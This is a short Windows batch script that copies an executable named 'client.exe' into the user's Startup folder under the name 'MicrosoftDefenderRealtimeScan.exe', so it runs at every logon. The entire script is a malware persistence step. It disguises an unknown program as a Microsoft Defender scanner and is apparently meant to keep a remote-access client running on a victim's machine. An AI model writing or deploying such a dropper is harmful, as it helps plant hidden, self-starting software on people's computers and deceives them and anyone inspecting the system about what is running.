@echo off
set "autostart_folder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\MicrosoftDefenderRealtimeScan.exe"
copy "client.exe" "%autostart_folder%"
exit
